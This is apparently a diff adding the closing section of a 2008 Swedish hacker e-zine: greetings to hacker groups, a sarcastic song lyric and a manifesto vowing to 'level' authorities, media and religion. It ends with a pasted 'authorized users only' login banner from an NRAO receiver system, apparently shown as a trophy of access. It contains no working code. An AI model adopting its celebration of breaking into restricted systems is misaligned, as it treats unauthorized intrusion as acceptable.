+020, uXu, SHA, tC, TARDZINE, andra svenska guldkorn!
+h0no, dikline, ZF0, blackhatbloc, PHC, ~el8, b4b0, ...
+
+++
+
+Vill du ha några tips om hur man
+snabbt och lätt blir lycklig lilla vän!
+Då ska du lyssna nu:
+Smink, banta, TV, video & porrtidningar & nya, dyra kläder
+& putsa på din bil!
+Där har du ett bankkontor
+
+Och är du inte nöjd med vad samhället kan ge?
+Din otacksamma jävel!
+Sånna som dig vill vi inte se!
+
+.............
+. 0c Avslut..
++-----------+
+
+Tidigare i år skrev vi följande:
+"MYNDIGHETER, SKOLOR, MEDIA, RELIGION OCH ANNAT SKIT SOM ENDAST FINNS TILL FÖR
+ATT KUVA DEN ENSKILDE INDIVIDEN -- ALLT JÄMNAR VI MED MARKEN I HOPP OM EN BÄTTRE
+MORGONDAG."
+
+Har under året delat med oss lite av vad vi samlat på oss, men det är bara en
+bråkdel av vad som finns... m3r dj3fvUl5k4p är på G!
+
+                 +-----VFH-CH3CKL157-(l33t)----+
+                 |                             |
+                 |       [x] MYNDIGHETER       |
+                 |       [ ] SKOLOR            |
+                 |       [x] MEDIA             |
+                 |       [x] RELIGION          |
+                 |                             |
+                 +-----VFH-CH3CKL157-(l33t)----+
+
+Vad nästa zine kommer att handla om är därmed ett faktum. ELLER INTE.
+
+FUCK THAQT SHIT.
+
+With l0v3
+Vuxna Förbannade Hackare
+2008-XX-XX
+
+
+***************************************************************************
+                     National Radio Astronomy Observatory
+                              Authorized use only                   
+                  NRAO Gold Book at http://www.nrao.edu/gold
+***************************************************************************
+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+ ]]]]]]]]]]      ]]]]]  ]]]]]]]]]  ]]]]]     ]]]                             
+ ]]]]]]]]]  ]]]]]]]]]  ]]]]]]]]]  ]]]]]     ]] ]]                            
+ ]]]]]]]]  ]]]]]]]]]  ]]]]]]       ]]]     ]]  ]]                            
+ ]]]]]]]  ]]]]]]]]]  ]]]]]]]]]  ]]]]]     ]]   ]]     ]]]]]]]]]     ]]]]]]]   
+ ]]]]]]  ]]]]]]]]]  ]]]]]]]]]  ]]]]]     ]]    ]]    ]]]]           ]]    ]] 
+ ]]]]]  ]]]]]]]]]       ]]]]  ]]]]]     ]]    ]]     ]]]]           ]]   ]]  
+ ]]]]  ]]]   ]]]  ]]]  ]]]]  ]]]]]     ]]   ]]       ]]]]           ]]]]]]     
+ ]]]  ]]]]  ]]]  ]]]  ]]]]  ]]]]]     ]]  ]]         ]]]]           ]]   ]]     
+ ]]        ]]]       ]]]]  ]]]]]     ]]]]]            ]]]]]]]]]     ]]    ]]  
+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]       Digital Continuum Receiver Backend
+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]     Warning Not a public use system  
+ ]]]]]]]]]]]]]]]]]]]]]]]]]]      Authorized users only
+ ]]]]]]]]]]]]]]]]]]]]]]]]]    
+
+
